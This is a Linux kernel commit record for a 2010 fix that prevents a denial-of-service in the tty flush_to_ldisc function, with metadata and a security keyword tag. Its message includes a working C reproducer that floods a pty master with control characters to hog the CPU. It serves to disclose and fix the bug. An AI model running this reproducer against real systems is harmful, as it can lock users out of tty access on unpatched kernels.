@@ -1,0 +1,78 @@
+Commit Hash: e045fec48970df84647a47930fcf7a22ff7229c0
+Subject: tty: prevent DOS in the flush_to_ldisc
+
+
+Security Keywords:
+- exploit
+
+Full commit message:
+tty: prevent DOS in the flush_to_ldisc
+
+There's a small window inside the flush_to_ldisc function,
+where the tty is unlocked and calling ldisc's receive_buf
+function. If in this window new buffer is added to the tty,
+the processing might never leave the flush_to_ldisc function.
+
+This scenario will hog the cpu, causing other tty processing
+starving, and making it impossible to interface the computer
+via tty.
+
+I was able to exploit this via pty interface by sending only
+control characters to the master input, causing the flush_to_ldisc
+to be scheduled, but never actually generate any output.
+
+To reproduce, please run multiple instances of following code.
+
+- SNIP
+#define _XOPEN_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv)
+{
+        int i, slave, master = getpt();
+        char buf[8192];
+
+        sprintf(buf, "%s", ptsname(master));
+        grantpt(master);
+        unlockpt(master);
+
+        slave = open(buf, O_RDWR);
+        if (slave < 0) {
+                perror("open slave failed");
+                return 1;
+        }
+
+        for(i = 0; i < sizeof(buf); i++)
+                buf[i] = rand() % 32;
+
+        while(1) {
+                write(master, buf, sizeof(buf));
+        }
+
+        return 0;
+}
+- SNIP
+
+The attached patch (based on -next tree) fixes this by checking on the
+tty buffer tail. Once it's reached, the current work is rescheduled
+and another could run.
+
+Signed-off-by: Jiri Olsa <jolsa@redhat.com>
+Cc: stable <stable@kernel.org>
+Acked-by: Alan Cox <alan@lxorguk.ukuu.org.uk>
+Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
+
+Metadata:
+Author: Jiri Olsa <jolsa@redhat.com>
+Author Date: Mon Nov 8 19:01:47 2010 +0100
+Committer: Greg Kroah-Hartman <gregkh@suse.de>
+Commit Date: Tue Nov 9 15:02:02 2010 -0800
+
+Files Changed: 1
+Lines Added: 12
+Lines Removed: 2
+Total Changes: 14
